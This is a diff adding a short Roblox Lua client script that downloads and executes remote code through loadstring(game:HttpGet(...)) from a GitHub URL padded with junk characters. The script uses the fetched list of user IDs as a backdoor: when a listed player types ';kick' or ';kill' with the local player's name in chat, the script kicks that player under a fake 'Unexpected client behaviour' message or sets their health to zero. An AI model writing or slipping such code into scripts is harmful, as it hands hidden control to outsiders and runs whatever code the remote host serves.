@@ -1,0 +1,21 @@
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+local List = loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestWasTaken/jisdvbnouewaf93myc94792384c234c23cnn57c502c7590n750972n95c7n2n55n25722nn59157019573907fc4c408723mc09/main/jisdvbnouewaf93myc94792384c234c23cnn57c50jisdvbnouewaf93myc94792384c234c23cnn57c502c7590n750972n95c7n2n55n25722nn59157019573907fc4c408723mc095c7n2n55n25722nn59157019573907fc4c408723mc09jisdvbnouewaf93myc94792384c234c23cnn57c50jisdvbnouewaf93myc94792384c234c23cnn57c502c7590n750972n95c7n2n55n25722nn59157019573907fc4c408723mc095c7n2n55n25722nn59157019573907fc4c408723mc09"))()
+
+local function Connect(player)
+  v.Chatted:Connect(function(msg)
+    if table.find(List, player.UserId) then
+      if msg == (";kick "..Player.Name) then
+        Player:Kick("Unexpected client behaviour") -- lol shit on
+      elseif msg == (";kill "..Player.Name) then
+        Player.Character.Humanoid.Health = 0
+      end
+    end
+  end)
+end
+
+Players.PlayerAdded:Connect(Connect)
+for _,player in next, Players:GetPlayers() do
+  Connect(player)
+end
